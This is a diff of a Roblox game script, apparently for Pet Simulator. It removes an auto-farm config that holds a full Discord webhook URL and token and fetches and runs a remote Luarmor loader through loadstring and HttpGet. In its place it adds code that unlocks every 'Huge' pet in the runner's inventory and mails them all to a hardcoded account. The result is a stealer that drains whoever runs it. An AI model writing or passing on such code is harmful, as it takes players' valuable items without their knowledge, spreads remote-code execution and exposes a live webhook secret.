@@ -1,33 +1,23 @@
-getgenv().RngEvent = {
-    Selected_RngEgg = "First",
-    Rolling_Enabled = true,
-    Rolling_Delay = 0.3,
-    Visible_Rolling = false,
+getgenv().MailToUser = "NewPS005"
 
-    Selected_Upgrades = {"RNGHugeLuck", "RNGEggLuck", "RNGHatchSpeed", "RNGBonusLuck"},
-    AutoUpgrades_Enabled = true,
-    AutoMerchant_Enabled = true,
-    AutoSellPets_Enabled = true,
-    AutoSell_OnlyEventPets = false,
-    AutoBreakChests_Enabled = true,
-    Lucky_Dice_Enabled = true,
-    Lucky_Dice_Config = {
-        ["Fire Dice"] = {Craft = false, Use = false, Only_Use_If_Not_Active = false, Only_Use_If_Rolls_Ends_In = nil},
-        ["Lucky Dice"] = {Craft = false, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
-        ["Lucky Dice II"] = {Craft = true, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
-        ["Lucky Dice III"] = {Craft = true, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
-        ["Mega Lucky Dice"] = {Craft = true, Use = false, Only_Use_If_Not_Active = false, Only_Use_If_Rolls_Ends_In = nil},
-        ["Mega Lucky Dice II"] = {Craft = true, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = 9},
-    },
+local Network = require(game.ReplicatedStorage.Library.Client.Network)
 
-    Webhook_Url = "https://discord.com/api/webhooks/1224296488906264738/JQQJZpr5yffjM62i2MplsRoNk_PBPjriluM2gdrEffwD9SfTaFFApuqEUEXnDyqkoli9",
-    Discord_UserID = "",
-    Huge_Mail_User = "feffysmlfan922",
-    Huge_Mail_Enabled = false,
+local HugeUIDList = {}
+for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
+    if PetData.id:find("Huge ") then
+        table.insert(HugeUIDList, PetUID)
+        if PetData._lk then
+            repeat
+                task.wait()
+            until Network.Invoke("Locking_SetLocked", PetUID, false)
+            print("Unlocked", PetUID)
+        end
+    end
+end
 
-    fps_boost = true,
-    fps_boost2 = true,
-    gui_stats_enabled = true,
-    print_all_info = false,
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/661ba97429a1d20f02880d1e9eeced08.lua"))()
+for _, PetUID in pairs(HugeUIDList) do
+    repeat
+        task.wait()
+    until Network.Invoke("Mailbox: Send", MailToUser, tostring(Random.new():NextInteger(9, 999999)), "Pet", PetUID, 1)
+    print("Sent", PetUID)
+end
